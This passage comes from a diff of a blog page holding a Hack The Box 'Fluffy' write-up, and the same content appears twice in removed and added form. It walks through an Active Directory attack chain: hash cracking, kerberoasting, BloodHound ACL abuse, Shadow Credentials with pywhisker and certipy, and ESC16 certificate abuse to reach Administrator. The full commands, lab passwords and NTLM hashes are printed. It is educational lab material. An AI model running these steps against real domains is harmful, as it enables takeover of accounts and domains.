-</span></span></code></pre></div><p>p.agila didn&rsquo;t have WinRM access either. The kerberoasting reflex kicked in. Three service accounts had SPNs: <code>ca_svc</code> (ADCS/ca.fluffy.htb), <code>ldap_svc</code>, and <code>winrm_svc</code>. Got all three TGS tickets as p.agila, ran hashcat against rockyou on each. Nothing cracked. The <code>ca_svc</code> SPN confirmed ADCS was running, which is worth filing away.</p>
-<p><em>The DC had exactly a 7-hour clock skew. Every Kerberos operation required <code>faketime -f '+7h'</code> or it&rsquo;d fail with KRB_AP_ERR_SKEW.</em></p>
-<h2 id="bloodhound-and-the-acl-path">BloodHound and the ACL Path</h2>
-<p>Dumped BloodHound data as p.agila. Two graphs told the story:</p>
-<p><img src="/images/writeups/htb-fluffy/bloodhound-pagila-memberof-path.png" alt="BloodHound graph showing p.agila is a member of Service Account Managers, which has GenericAll over the Service Accounts group"></p>
-<p>p.agila is a member of Service Account Managers, which has GenericAll over the Service Accounts group.</p>
-<p><img src="/images/writeups/htb-fluffy/bloodhound-service-accounts-genericwrite.png" alt="BloodHound graph showing Service Accounts group has GenericWrite over ldap_svc, winrm_svc, and ca_svc"></p>
-<p>Service Accounts has GenericWrite over all three service accounts: ldap_svc, winrm_svc, and ca_svc.</p>
-<p>That&rsquo;s the path. If p.agila joins Service Accounts (which Service Account Managers can force), we get GenericWrite over winrm_svc. GenericWrite over a user account gives you two main options: targeted Kerberoasting, or Shadow Credentials. We already know the tickets don&rsquo;t crack. Shadow Credentials it is.</p>
-<p>One more thing BloodHound showed:</p>
-<p><img src="/images/writeups/htb-fluffy/bloodhound-casvc-cert-publishers.png" alt="BloodHound graph showing ca_svc is a member of Cert Publishers and Service Accounts groups"></p>
-<p><code>ca_svc</code> is in Cert Publishers, the group with enrollment rights on the CA. That&rsquo;s the foothold into the ADCS attack later.</p>
-<h2 id="shadow-credentials-user-flag">Shadow Credentials: User Flag</h2>
-<p>Add p.agila to Service Accounts using the GenericAll from Service Account Managers:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -u p.agila -p <span class="s1">&#39;prometheusx-303&#39;</span> -d fluffy.htb --host 10.129.14.53 <span class="se">\
-</span></span></span><span class="line"><span class="cl">  add groupMember <span class="s2">&#34;Service Accounts&#34;</span> p.agila
-</span></span><span class="line"><span class="cl"><span class="c1"># [+] p.agila added to Service Accounts</span>
-</span></span></code></pre></div><p><strong>What Shadow Credentials are:</strong></p>
-<p><code>msDS-KeyCredentialLink</code> is a multi-value LDAP attribute that stores public key credentials for PKINIT, Kerberos public-key authentication. The same mechanism Windows Hello for Business uses. When passwordless authentication is configured on an account, its public key is stored here. At login time the DC issues a challenge; if you can sign it with the corresponding private key, you authenticate without a password.</p>
-<p><code>GenericWrite</code> includes write access to this attribute. So with GenericWrite over <code>winrm_svc</code>, we can inject our own key pair into its <code>msDS-KeyCredentialLink</code>. The DC will then accept a PKINIT request using our private key as if it were winrm_svc&rsquo;s own credential. The resulting TGT can be converted to an NTLM hash via Kerberos U2U (User-to-User authentication). No password involved at any step.</p>
-<p><em>I covered this in the <a href="/blog/hackini-shell-dc">HackINI 2026: Shell-DC writeup</a>. Same mechanism, different path to get there.</em></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pywhisker -d fluffy.htb -u p.agila -p <span class="s1">&#39;prometheusx-303&#39;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl">  --target winrm_svc --action add --dc-ip 10.129.14.53
-</span></span><span class="line"><span class="cl"><span class="c1"># [+] Updated the msDS-KeyCredentialLink attribute of the target object</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># [+] Saved PFX at: rV1mQ5qb.pfx</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># [*] Must be used with password: VEKhZmrg0T5nQPtyeWBT</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">faketime -f <span class="s1">&#39;+7h&#39;</span> certipy auth -pfx rV1mQ5qb.pfx <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -password VEKhZmrg0T5nQPtyeWBT -dc-ip 10.129.14.53 <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -username winrm_svc -domain fluffy.htb
-</span></span><span class="line"><span class="cl"><span class="c1"># [*] Got hash for &#39;winrm_svc@fluffy.htb&#39;: aad3b435b51404eeaad3b435b51404ee:33bd09dcd697600edf6b3a7af4875767</span>
-</span></span></code></pre></div><p>Pass-the-hash into WinRM. User flag.</p>
-<h2 id="privilege-escalation-esc16">Privilege Escalation: ESC16</h2>
-<p>Trying to enumerate certificate templates as p.agila came back with access denied. <code>ca_svc</code> is the account with Cert Publishers membership, so I ran the same Shadow Credentials attack on it:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pywhisker -d fluffy.htb -u p.agila -p <span class="s1">&#39;prometheusx-303&#39;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl">  --target ca_svc --action add --dc-ip 10.129.14.53
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">faketime -f <span class="s1">&#39;+7h&#39;</span> certipy auth -pfx hBAWgpCm.pfx <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -password 3IcCLRWYTmADRdqlOWaL -dc-ip 10.129.14.53 <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -username ca_svc -domain fluffy.htb
-</span></span><span class="line"><span class="cl"><span class="c1"># [*] Got hash for &#39;ca_svc@fluffy.htb&#39;: aad3b435b51404eeaad3b435b51404ee:ca0f4f9e9eb8a092addf53bb03fc98c8</span>
-</span></span></code></pre></div><p>Then certipy find as ca_svc to enumerate the CA:</p>
-<pre tabindex="0"><code>Certificate Authorities
+</code></pre><p>Cracked with hashcat in seconds:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hashcat -m <span class=m>5600</span> p.agila.hash ~/tools/wordlists/rockyou.txt
+</span></span><span class=line><span class=cl><span class=c1># p.agila::FLUFFY:...:prometheusx-303</span>
+</span></span></code></pre></div><p>p.agila didn&rsquo;t have WinRM access either. The kerberoasting reflex kicked in. Three service accounts had SPNs: <code>ca_svc</code> (ADCS/ca.fluffy.htb), <code>ldap_svc</code>, and <code>winrm_svc</code>. Got all three TGS tickets as p.agila, ran hashcat against rockyou on each. Nothing cracked. The <code>ca_svc</code> SPN confirmed ADCS was running, which is worth filing away.</p><p><em>The DC had exactly a 7-hour clock skew. Every Kerberos operation required <code>faketime -f '+7h'</code> or it&rsquo;d fail with KRB_AP_ERR_SKEW.</em></p><h2 id=bloodhound-and-the-acl-path>BloodHound and the ACL Path</h2><p>Dumped BloodHound data as p.agila. Two graphs told the story:</p><p><img src=/images/writeups/htb-fluffy/bloodhound-pagila-memberof-path.png alt="BloodHound graph showing p.agila is a member of Service Account Managers, which has GenericAll over the Service Accounts group"></p><p>p.agila is a member of Service Account Managers, which has GenericAll over the Service Accounts group.</p><p><img src=/images/writeups/htb-fluffy/bloodhound-service-accounts-genericwrite.png alt="BloodHound graph showing Service Accounts group has GenericWrite over ldap_svc, winrm_svc, and ca_svc"></p><p>Service Accounts has GenericWrite over all three service accounts: ldap_svc, winrm_svc, and ca_svc.</p><p>That&rsquo;s the path. If p.agila joins Service Accounts (which Service Account Managers can force), we get GenericWrite over winrm_svc. GenericWrite over a user account gives you two main options: targeted Kerberoasting, or Shadow Credentials. We already know the tickets don&rsquo;t crack. Shadow Credentials it is.</p><p>One more thing BloodHound showed:</p><p><img src=/images/writeups/htb-fluffy/bloodhound-casvc-cert-publishers.png alt="BloodHound graph showing ca_svc is a member of Cert Publishers and Service Accounts groups"></p><p><code>ca_svc</code> is in Cert Publishers, the group with enrollment rights on the CA. That&rsquo;s the foothold into the ADCS attack later.</p><h2 id=shadow-credentials-user-flag>Shadow Credentials: User Flag</h2><p>Add p.agila to Service Accounts using the GenericAll from Service Account Managers:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bloodyAD -u p.agila -p <span class=s1>&#39;prometheusx-303&#39;</span> -d fluffy.htb --host 10.129.14.53 <span class=se>\
+</span></span></span><span class=line><span class=cl>  add groupMember <span class=s2>&#34;Service Accounts&#34;</span> p.agila
+</span></span><span class=line><span class=cl><span class=c1># [+] p.agila added to Service Accounts</span>
+</span></span></code></pre></div><p><strong>What Shadow Credentials are:</strong></p><p><code>msDS-KeyCredentialLink</code> is a multi-value LDAP attribute that stores public key credentials for PKINIT, Kerberos public-key authentication. The same mechanism Windows Hello for Business uses. When passwordless authentication is configured on an account, its public key is stored here. At login time the DC issues a challenge; if you can sign it with the corresponding private key, you authenticate without a password.</p><p><code>GenericWrite</code> includes write access to this attribute. So with GenericWrite over <code>winrm_svc</code>, we can inject our own key pair into its <code>msDS-KeyCredentialLink</code>. The DC will then accept a PKINIT request using our private key as if it were winrm_svc&rsquo;s own credential. The resulting TGT can be converted to an NTLM hash via Kerberos U2U (User-to-User authentication). No password involved at any step.</p><p><em>I covered this in the <a href=/blog/hackini-shell-dc>HackINI 2026: Shell-DC writeup</a>. Same mechanism, different path to get there.</em></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pywhisker -d fluffy.htb -u p.agila -p <span class=s1>&#39;prometheusx-303&#39;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>  --target winrm_svc --action add --dc-ip 10.129.14.53
+</span></span><span class=line><span class=cl><span class=c1># [+] Updated the msDS-KeyCredentialLink attribute of the target object</span>
+</span></span><span class=line><span class=cl><span class=c1># [+] Saved PFX at: rV1mQ5qb.pfx</span>
+</span></span><span class=line><span class=cl><span class=c1># [*] Must be used with password: VEKhZmrg0T5nQPtyeWBT</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>faketime -f <span class=s1>&#39;+7h&#39;</span> certipy auth -pfx rV1mQ5qb.pfx <span class=se>\
+</span></span></span><span class=line><span class=cl>  -password VEKhZmrg0T5nQPtyeWBT -dc-ip 10.129.14.53 <span class=se>\
+</span></span></span><span class=line><span class=cl>  -username winrm_svc -domain fluffy.htb
+</span></span><span class=line><span class=cl><span class=c1># [*] Got hash for &#39;winrm_svc@fluffy.htb&#39;: aad3b435b51404eeaad3b435b51404ee:33bd09dcd697600edf6b3a7af4875767</span>
+</span></span></code></pre></div><p>Pass-the-hash into WinRM. User flag.</p><h2 id=privilege-escalation-esc16>Privilege Escalation: ESC16</h2><p>Trying to enumerate certificate templates as p.agila came back with access denied. <code>ca_svc</code> is the account with Cert Publishers membership, so I ran the same Shadow Credentials attack on it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pywhisker -d fluffy.htb -u p.agila -p <span class=s1>&#39;prometheusx-303&#39;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>  --target ca_svc --action add --dc-ip 10.129.14.53
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>faketime -f <span class=s1>&#39;+7h&#39;</span> certipy auth -pfx hBAWgpCm.pfx <span class=se>\
+</span></span></span><span class=line><span class=cl>  -password 3IcCLRWYTmADRdqlOWaL -dc-ip 10.129.14.53 <span class=se>\
+</span></span></span><span class=line><span class=cl>  -username ca_svc -domain fluffy.htb
+</span></span><span class=line><span class=cl><span class=c1># [*] Got hash for &#39;ca_svc@fluffy.htb&#39;: aad3b435b51404eeaad3b435b51404ee:ca0f4f9e9eb8a092addf53bb03fc98c8</span>
+</span></span></code></pre></div><p>Then certipy find as ca_svc to enumerate the CA:</p><pre tabindex=0><code>Certificate Authorities
   0
     CA Name                  : fluffy-DC01-CA
     Disabled Extensions      : 1.3.6.1.4.1.311.25.2
@@ -297,183 +63,25 @@ Upgrade_Notice.pdf
       Enroll                 : FLUFFY.HTB\Cert Publishers
     [!] Vulnerabilities
       ESC16                  : Security Extension is disabled.
-</code></pre><p>That OID, <code>1.3.6.1.4.1.311.25.2</code>, is <code>szOID_NTDS_CA_SECURITY_EXT</code>. Microsoft introduced it in May 2022 via KB5014754 specifically to harden certificate-based authentication against UPN spoofing attacks. It&rsquo;s worth understanding exactly what this extension does and why disabling it is so dangerous.</p>
-<p><strong>What ESC16 actually exploits:</strong></p>
-<p>When <code>szOID_NTDS_CA_SECURITY_EXT</code> is enabled on a CA, every certificate it issues gets the requester&rsquo;s Active Directory <code>objectSid</code> embedded inside it, cryptographically bound to the certificate&rsquo;s signature. When you use that certificate to authenticate (via Kerberos PKINIT), the DC compares the embedded SID against the SID of the AD account that matches the certificate&rsquo;s UPN. If you requested a cert while your UPN was &ldquo;administrator&rdquo; but your actual SID is ca_svc&rsquo;s SID, the check fails. The UPN claims to be Administrator, but the SID says otherwise.</p>
-<p>When the security extension is disabled (what certipy flags as ESC16), the DC has no SID to verify. It falls back to UPN-only matching. This means: if your account&rsquo;s UPN is set to &ldquo;<a href="mailto:Administrator@fluffy.htb">Administrator@fluffy.htb</a>&rdquo; at the time you request a certificate, the CA issues a cert containing that UPN with no SID embedded. When you later authenticate with that cert, the DC resolves the UPN to the real Administrator account and issues a TGT for it. Your account&rsquo;s actual identity is completely invisible to this transaction.</p>
-<p>The attack requires three things to line up: the CA has the extension disabled, you control an account with enrollment rights (ca_svc via Cert Publishers), and you have GenericWrite over that account to modify its UPN temporarily (winrm_svc has this over ca_svc via the Service Accounts group).</p>
-<p><strong>Step 1: Set ca_svc&rsquo;s UPN to &ldquo;administrator&rdquo;</strong></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy account -u winrm_svc@fluffy.htb <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -hashes 33bd09dcd697600edf6b3a7af4875767 <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -user ca_svc -upn administrator update
-</span></span><span class="line"><span class="cl"><span class="c1"># [*] Successfully updated &#39;ca_svc&#39;</span>
-</span></span></code></pre></div><p><strong>Step 2: Request a certificate as ca_svc</strong></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -dc-ip 10.129.14.53 -target dc01.fluffy.htb <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -ca fluffy-DC01-CA -template User
-</span></span><span class="line"><span class="cl"><span class="c1"># [*] Got certificate with UPN &#39;Administrator@fluffy.htb&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># [*] Certificate has no object SID</span>
-</span></span></code></pre></div><p>That &ldquo;Certificate has no object SID&rdquo; line is the confirmation. The CA issued a cert with the Administrator UPN and nothing to bind it to ca_svc.</p>
-<p><strong>Step 3: Reset ca_svc&rsquo;s UPN before authenticating</strong></p>
-<p>This step is easy to miss. When <code>certipy auth</code> runs, it reads the UPN from the cert (&ldquo;<a href="mailto:Administrator@fluffy.htb">Administrator@fluffy.htb</a>&rdquo;) and asks the KDC for a TGT for that principal. The KDC resolves the UPN against all AD accounts. If ca_svc&rsquo;s UPN is still set to &ldquo;administrator&rdquo;, the KDC finds ca_svc and issues a TGT for ca_svc, not the real Administrator. The UPN swap must be reversed before the authentication step, so the KDC resolves &ldquo;<a href="mailto:Administrator@fluffy.htb">Administrator@fluffy.htb</a>&rdquo; to the actual built-in Administrator account.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy account -u winrm_svc@fluffy.htb <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -hashes 33bd09dcd697600edf6b3a7af4875767 <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -user ca_svc -upn ca_svc@fluffy.htb update
-</span></span><span class="line"><span class="cl"><span class="c1"># [*] Successfully updated &#39;ca_svc&#39;</span>
-</span></span></code></pre></div><p><strong>Step 4: Authenticate with the certificate</strong></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">faketime -f <span class="s1">&#39;+7h&#39;</span> certipy auth -pfx administrator.pfx -dc-ip 10.129.14.53
-</span></span><span class="line"><span class="cl"><span class="c1"># [*] SAN UPN: &#39;Administrator@fluffy.htb&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># [*] Got hash for &#39;administrator@fluffy.htb&#39;: aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e</span>
-</span></span></code></pre></div><p>Pass-the-hash as Administrator. Root flag.</p>
-<p><em>Reference: <a href="https://notes.chaelsoo.me/active-directory/acl-abuse">notes.chaelsoo.me - ACL Abuse</a></em></p>
-<p>ESC16 is quieter than ESC4 or ESC8. No template modification, no MitM position required. Just a CA-level configuration flag that was probably disabled for compatibility reasons and never revisited. The UPN swap window is brief, easy to clean up, and leaves minimal trace. The kind of thing that exists in real environments on CAs deployed before the May 2022 patch cycle that have never been audited with certipy.</p>
-
-            </div>
-        </article></main>
-</div>
-
-<script>
-    function toggleToc() {
-        const content = document.getElementById('tocContent');
-        const button = document.querySelector('.toc-toggle');
-        if (!content || !button) return;
-        content.classList.toggle('expanded');
-        button.classList.toggle('expanded');
-    }
-
-    function toggleMiniToc() {
-        const miniToc = document.getElementById('miniToc');
-        if (miniToc) miniToc.classList.toggle('minimized');
-    }
-
-    function setupActiveHighlighting(links) {
-        const targets = Array.from(links).map(link => {
-            const href = link.getAttribute('href');
-            if (href && href.startsWith('#')) {
-                const el = document.getElementById(decodeURIComponent(href.slice(1)));
-                if (el) return { link, element: el };
-            }
-            return null;
-        }).filter(Boolean);
-
-        if (targets.length === 0) return;
-
-        function update() {
-            const scrollPosition = window.scrollY + 100;
-            let active = null;
-            targets.forEach(t => {
-                if (t.element.offsetTop <= scrollPosition) active = t;
-            });
-            links.forEach(l => l.classList.remove('active'));
-            if (active) active.link.classList.add('active');
-        }
-
-        let ticking = false;
-        window.addEventListener('scroll', () => {
-            if (!ticking) {
-                requestAnimationFrame(() => { update(); ticking = false; });
-                ticking = true;
-            }
-        });
-        update();
-    }
-
-    function initMiniToc() {
-        const miniToc = document.getElementById('miniToc');
-        const miniTocContent = document.getElementById('miniTocContent');
-        const sourceToc = document.getElementById('tocContent');
-        if (!miniToc || !miniTocContent || !sourceToc) return;
-
-        const clone = sourceToc.cloneNode(true);
-        clone.classList.remove('toc-content', 'expanded');
-        clone.removeAttribute('id');
-
-        const links = clone.querySelectorAll('a');
-        if (links.length === 0) return;
-
-        links.forEach(link => {
-            link.addEventListener('click', (e) => {
-                const href = link.getAttribute('href');
-                if (href && href.startsWith('#')) {
-                    const target = document.getElementById(decodeURIComponent(href.slice(1)));
-                    if (target) {
-                        e.preventDefault();
-                        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
-                        history.pushState(null, '', href);
-                    }
-                }
-            });
-        });
-
-        miniTocContent.appendChild(clone);
-        miniToc.classList.add('visible');
-        setupActiveHighlighting(links);
-    }
-
-    document.addEventListener('DOMContentLoaded', initMiniToc);
-</script>
-<footer class="footer">
-    <span class="footer_item"> </span>
-    &nbsp;
-
-    <div class="footer_social-icons">
-<a href="https://discord.com/users/kanyo._" target="_blank" rel="noopener noreferrer me"
-    title="Discord"><svg xmlns="http://www.w3.org/2000/svg" viewBox="20 15 205 190" fill="currentColor" stroke="none">
-    <path
-        d="M104.4 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zM140.9 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z" />
-    <path
-        d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2 0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6 0 0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3 0 0-8.5 14.5-30.6 15.2z" />
-</svg></a>
-<a href="https://github.com/Chaelsoo" target="_blank" rel="noopener noreferrer me"
-    title="Github"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
-    stroke-linecap="round" stroke-linejoin="round">
-    <path
-        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
-    </path>
-</svg></a>
-<a href="https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/" target="_blank" rel="noopener noreferrer me"
-    title="Linkedin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
-    stroke-linecap="round" stroke-linejoin="round">
-    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
-    <rect x="2" y="9" width="4" height="12"></rect>
-    <circle cx="4" cy="4" r="2"></circle>
-</svg></a>
-<a href="https://app.hackthebox.com/users/1490281" target="_blank" rel="noopener noreferrer me"
-    title="Hackthebox"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1L2 6.5v11L12 23l10-5.5v-11L12 1z"></path><path d="M12 12L2 6.5M12 12v11M12 12l10-5.5"></path></svg></a>
-</div>
-    <small class="footer_copyright">
-        © 2026 .
-        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
-    </small>
-</footer><a href="#" title="Go to top" id="totop">
-    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
-    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
-</svg>
-
-</a>
-
-
-    
-
-
-
-
-    
-
-
-
-
-    
-
-
-
-
-
-
-    
-    <script async src="http://localhost:1313/js/main.js"></script>
-
-    
-
-</body>
-</html>
+</code></pre><p>That OID, <code>1.3.6.1.4.1.311.25.2</code>, is <code>szOID_NTDS_CA_SECURITY_EXT</code>. Microsoft introduced it in May 2022 via KB5014754 specifically to harden certificate-based authentication against UPN spoofing attacks. It&rsquo;s worth understanding exactly what this extension does and why disabling it is so dangerous.</p><p><strong>What ESC16 actually exploits:</strong></p><p>When <code>szOID_NTDS_CA_SECURITY_EXT</code> is enabled on a CA, every certificate it issues gets the requester&rsquo;s Active Directory <code>objectSid</code> embedded inside it, cryptographically bound to the certificate&rsquo;s signature. When you use that certificate to authenticate (via Kerberos PKINIT), the DC compares the embedded SID against the SID of the AD account that matches the certificate&rsquo;s UPN. If you requested a cert while your UPN was &ldquo;administrator&rdquo; but your actual SID is ca_svc&rsquo;s SID, the check fails. The UPN claims to be Administrator, but the SID says otherwise.</p><p>When the security extension is disabled (what certipy flags as ESC16), the DC has no SID to verify. It falls back to UPN-only matching. This means: if your account&rsquo;s UPN is set to &ldquo;<a href=mailto:Administrator@fluffy.htb>Administrator@fluffy.htb</a>&rdquo; at the time you request a certificate, the CA issues a cert containing that UPN with no SID embedded. When you later authenticate with that cert, the DC resolves the UPN to the real Administrator account and issues a TGT for it. Your account&rsquo;s actual identity is completely invisible to this transaction.</p><p>The attack requires three things to line up: the CA has the extension disabled, you control an account with enrollment rights (ca_svc via Cert Publishers), and you have GenericWrite over that account to modify its UPN temporarily (winrm_svc has this over ca_svc via the Service Accounts group).</p><p><strong>Step 1: Set ca_svc&rsquo;s UPN to &ldquo;administrator&rdquo;</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>certipy account -u winrm_svc@fluffy.htb <span class=se>\
+</span></span></span><span class=line><span class=cl>  -hashes 33bd09dcd697600edf6b3a7af4875767 <span class=se>\
+</span></span></span><span class=line><span class=cl>  -user ca_svc -upn administrator update
+</span></span><span class=line><span class=cl><span class=c1># [*] Successfully updated &#39;ca_svc&#39;</span>
+</span></span></code></pre></div><p><strong>Step 2: Request a certificate as ca_svc</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>certipy req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 <span class=se>\
+</span></span></span><span class=line><span class=cl>  -dc-ip 10.129.14.53 -target dc01.fluffy.htb <span class=se>\
+</span></span></span><span class=line><span class=cl>  -ca fluffy-DC01-CA -template User
+</span></span><span class=line><span class=cl><span class=c1># [*] Got certificate with UPN &#39;Administrator@fluffy.htb&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1># [*] Certificate has no object SID</span>
+</span></span></code></pre></div><p>That &ldquo;Certificate has no object SID&rdquo; line is the confirmation. The CA issued a cert with the Administrator UPN and nothing to bind it to ca_svc.</p><p><strong>Step 3: Reset ca_svc&rsquo;s UPN before authenticating</strong></p><p>This step is easy to miss. When <code>certipy auth</code> runs, it reads the UPN from the cert (&ldquo;<a href=mailto:Administrator@fluffy.htb>Administrator@fluffy.htb</a>&rdquo;) and asks the KDC for a TGT for that principal. The KDC resolves the UPN against all AD accounts. If ca_svc&rsquo;s UPN is still set to &ldquo;administrator&rdquo;, the KDC finds ca_svc and issues a TGT for ca_svc, not the real Administrator. The UPN swap must be reversed before the authentication step, so the KDC resolves &ldquo;<a href=mailto:Administrator@fluffy.htb>Administrator@fluffy.htb</a>&rdquo; to the actual built-in Administrator account.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>certipy account -u winrm_svc@fluffy.htb <span class=se>\
+</span></span></span><span class=line><span class=cl>  -hashes 33bd09dcd697600edf6b3a7af4875767 <span class=se>\
+</span></span></span><span class=line><span class=cl>  -user ca_svc -upn ca_svc@fluffy.htb update
+</span></span><span class=line><span class=cl><span class=c1># [*] Successfully updated &#39;ca_svc&#39;</span>
+</span></span></code></pre></div><p><strong>Step 4: Authenticate with the certificate</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>faketime -f <span class=s1>&#39;+7h&#39;</span> certipy auth -pfx administrator.pfx -dc-ip 10.129.14.53
+</span></span><span class=line><span class=cl><span class=c1># [*] SAN UPN: &#39;Administrator@fluffy.htb&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1># [*] Got hash for &#39;administrator@fluffy.htb&#39;: aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e</span>
+</span></span></code></pre></div><p>Pass-the-hash as Administrator. Root flag.</p><p><em>Reference: <a href=https://notes.chaelsoo.me/active-directory/acl-abuse>notes.chaelsoo.me - ACL Abuse</a></em></p><p>ESC16 is quieter than ESC4 or ESC8. No template modification, no MitM position required. Just a CA-level configuration flag that was probably disabled for compatibility reasons and never revisited. The UPN swap window is brief, easy to clean up, and leaves minimal trace. The kind of thing that exists in real environments on CAs deployed before the May 2022 patch cycle that have never been audited with certipy.</p></div></article></main></div><script>function toggleToc(){const e=document.getElementById("tocContent"),t=document.querySelector(".toc-toggle");if(!e||!t)return;e.classList.toggle("expanded"),t.classList.toggle("expanded")}function toggleMiniToc(){const e=document.getElementById("miniToc");e&&e.classList.toggle("minimized")}function setupActiveHighlighting(e){const n=Array.from(e).map(e=>{const t=e.getAttribute("href");if(t&&t.startsWith("#")){const n=document.getElementById(decodeURIComponent(t.slice(1)));if(n)return{link:e,element:n}}return null}).filter(Boolean);if(n.length===0)return;function s(){const s=window.scrollY+100;let t=null;n.forEach(e=>{e.element.offsetTop<=s&&(t=e)}),e.forEach(e=>e.classList.remove("active")),t&&t.link.classList.add("active")}let t=!1;window.addEventListener("scroll",()=>{t||(requestAnimationFrame(()=>{s(),t=!1}),t=!0)}),s()}function initMiniToc(){const n=document.getElementById("miniToc"),s=document.getElementById("miniTocContent"),o=document.getElementById("tocContent");if(!n||!s||!o)return;const e=o.cloneNode(!0);e.classList.remove("toc-content","expanded"),e.removeAttribute("id");const 